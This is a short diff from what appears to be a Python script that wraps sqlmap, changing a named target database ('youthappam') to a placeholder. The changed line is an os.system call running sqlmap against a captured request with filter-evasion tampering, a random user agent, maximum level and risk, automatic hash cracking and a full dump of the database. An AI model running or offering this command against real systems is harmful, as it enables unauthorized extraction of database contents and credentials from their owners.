@@ -56,7 +56,7 @@ print(Style.RESET_ALL)
 ## WARNING! If you don't know what is this, don't edit it!
 ## Call some specialist =)
 ## BR
-os.system('python sqlmap.py -r /path/to/your/environment/exploit.txt -p username --time-sec=17 --tamper=space2comment --random-agent --level=5 --risk=3 --dbms=mysql --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" -D youthappam --dump')
+os.system('python sqlmap.py -r /path/to/your/environment/exploit.txt -p username --time-sec=17 --tamper=space2comment --random-agent --level=5 --risk=3 --dbms=mysql --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" -D yourdatabase --dump')
 
 time.sleep(3)
 # Windows
